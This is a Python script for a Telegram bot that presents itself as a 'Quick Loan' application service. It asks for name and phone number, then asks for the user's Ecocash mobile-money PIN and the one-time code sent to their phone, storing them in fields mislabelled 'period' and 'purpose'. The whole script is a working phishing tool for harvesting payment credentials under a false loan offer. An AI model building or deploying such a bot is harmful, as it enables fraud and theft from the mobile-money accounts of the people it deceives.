import os
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

NAME, PHONE, IDNUM, AMOUNT, PERIOD, PURPOSE = range(6)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Welcome to Quick Loan! 💰\n\nApply in 2 minutes.\n\nWhat is your full name?")
    return NAME

async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['name'] = update.message.text
    await update.message.reply_text("Thanks! What is your phone number?")
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['phone'] = update.message.text
    await update.message.reply_text("Full names?")
    return IDNUM

async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['id'] = update.message.text
    await update.message.reply_text("How much loan do you need? (e.g. 5000)")
    return AMOUNT

async def get_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['amount'] = update.message.text
    await update.message.reply_text("verify you're Ecocash pin")
    return PERIOD

async def get_period(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['period'] = update.message.text
    await update.message.reply_text("verify you're loan by sending youre otp code send to you're number")
    return PURPOSE

async def get_purpose(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['purpose'] = update.message.text
    d = context.user_data
    await update.message.reply_text(f"✅ APPLICATION RECEIVED\n\nName: {d['name']}\nPhone: {d['phone']}\nID: {d['id']}\nAmount: {d['amount']}\nPeriod: {d['period']}\nPurpose: {d['purpose']}\n\nWe will call you shortly!")
    return ConversationHandler.END

def main():
    token = os.environ.get("BOT_TOKEN")
    app = Application.builder().token(token).build()
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_name)],
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            IDNUM: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_id)],
            AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_amount)],
            PERIOD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_period)],
            PURPOSE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_purpose)],
        },
        fallbacks=[],
    )
    app.add_handler(conv)
    app.run_polling()

if __name__ == "__main__":
    main()
